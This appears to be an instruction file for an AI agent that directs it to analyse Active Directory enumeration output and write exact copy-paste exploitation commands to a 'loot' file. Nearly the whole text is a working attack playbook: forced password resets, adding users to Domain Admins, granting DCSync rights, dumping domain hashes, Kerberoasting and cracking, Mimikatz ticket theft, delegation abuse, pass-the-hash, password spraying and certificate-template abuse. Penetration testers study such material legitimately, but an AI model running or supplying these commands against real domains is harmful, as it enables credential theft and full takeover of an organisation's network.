Find Active Directory attack paths from the enumeration output or context in $ARGUMENTS. Produce exact copy-paste exploitation commands for each viable path. Write results to ~/osai/current/loot/ad_attack_paths.md.

$ARGUMENTS = target domain, DC IP, and/or PowerView/ldapsearch output to analyze. If no input provided, print the enumeration commands to run first.

## Phase 1: Enumerate (run these if no data yet)
```powershell
# PowerView — run from compromised Windows host
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | Select-Object samaccountname, description, memberof, serviceprincipalname, useraccountcontrol

# Kerberoastable (SPN set)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# ASREPRoastable (no preauth)
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# ACL misconfigs — most important
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -ne "Domain Admins"}

# Group memberships
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Remote Desktop Users"

# Unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object name, dnshostname

# Constrained delegation
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Local admin access
Find-LocalAdminAccess   # slow but valuable

# Domain trusts
Get-DomainTrust
```


## Phase 1b: BloodHound — map paths automatically (do this early)
```bash
# Remote collection from Kali (with creds)
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_FQDN> -c All -ns <DC_IP> --zip

# OR from a Windows foothold, drop SharpHound:
#   .\SharpHound.exe -c All --zipfilename loot.zip
```
Import the .zip into BloodHound GUI, then run these queries:
- Shortest Paths to Domain Admins
- Shortest Paths from Owned Principals (mark your foothold as Owned first)
- Kerberoastable / ASREPRoastable accounts
- Principals with DCSync rights
- Find Computers with Unconstrained Delegation
BloodHound surfaces GenericAll/WriteDacl/ForceChangePassword edges the manual
PowerView enum misses — always cross-check both.

## Phase 2: Attack paths by finding type

**GenericWrite on user → Force password or add to group:**
```powershell
# Change password
$pass = ConvertTo-SecureString 'Hacked1234!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $pass

# Add to group (if GenericWrite on group)
Add-DomainGroupMember -Identity "Domain Admins" -Members <YOUR_USER>
```

**WriteDACL on object → Grant DCSync:**
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity <YOUR_USER> \
  -Rights DCSync
```

**Kerberoasting:**
```bash
# Impacket (from Kali, with credentials)
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerberoast.hashes
# Crack
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

**ASREPRoasting:**
```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat \
  -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

**Unconstrained Delegation (computer account):**
```powershell
# Wait for privileged user to connect, extract TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
# Use ticket for PTT
Invoke-Mimikatz -Command '"kerberos::ptt <TICKET.kirbi>"'
```

**Constrained Delegation (s4u2proxy):**
```bash
impacket-getST -spn cifs/DC.domain.local DOMAIN/svc_account:password -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DC.domain.local
```

**RBCD (Resource-Based Constrained Delegation) — if you have GenericWrite on computer:**
```powershell
# Add fake computer with known password
impacket-addcomputer DOMAIN/user:pass -computer-name FAKE$ -computer-pass FakePass123!

# Set RBCD
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount FAKE$

# S4U2Self + S4U2Proxy
impacket-getST -spn cifs/<TARGET_COMPUTER> DOMAIN/FAKE$:FakePass123! -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_COMPUTER>
```

**DCSync (if you have Replication rights or DA):**
```bash
impacket-secretsdump DOMAIN/user:password@DC_IP -just-dc
impacket-secretsdump DOMAIN/user:password@DC_IP -just-dc-ntlm
# Then PTH with krbtgt NTLM for golden ticket or admin hash for immediate access
```

**Pass-the-Hash:**
```bash
impacket-psexec DOMAIN/Administrator@TARGET -hashes :NTLM_HASH
impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NTLM_HASH
evil-winrm -i TARGET -u Administrator -H NTLM_HASH
```

**Password spraying:**
```bash
# Check lockout policy first: net accounts /domain
crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password123'
```

**AdminSDHolder abuse (if WriteDACL on AdminSDHolder):**
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity <YOUR_USER> -Rights All
# Wait ~60 min for SDProp to propagate, then modify protected group members
```

**ADCS abuse (Certipy) — check EVERY AD engagement, extremely common:**
```bash
# Find vulnerable templates
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout

# ESC1 — template allows SAN + client-auth, low-priv can enrol:
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> \
  -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>   # → NT hash / TGT

# ESC8 — NTLM relay to CA web-enrol (AD CS HTTP endpoint):
certipy relay -ca <CA_HOST> -template DomainController
# (trigger coercion with PetitPotam/Coercer toward your relay)

# ESC3 — Enrolment Agent template → request on behalf of others
# ESC4 — you have write over a template → make it ESC1 then exploit
# ESC6 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 → any template becomes ESC1
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template User -upn administrator@<DOMAIN>
```
Certipy output names the ESC id directly — match it to the request above.

**ACL edges from BloodHound (GenericAll / GenericWrite / WriteOwner):**
```powershell
# WriteOwner → take ownership → grant yourself GenericAll → reset password
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <YOU>
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOU> -Rights All
$p = ConvertTo-SecureString 'Hacked1234!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET> -AccountPassword $p
```

## Phase 3: Output
For each viable path found:
```
PATH: <name>
EVIDENCE: <what was found in enumeration>
COMMAND: <exact copy-paste>
NEXT: <what to do after this succeeds>
```
Write to ~/osai/current/loot/ad_attack_paths.md
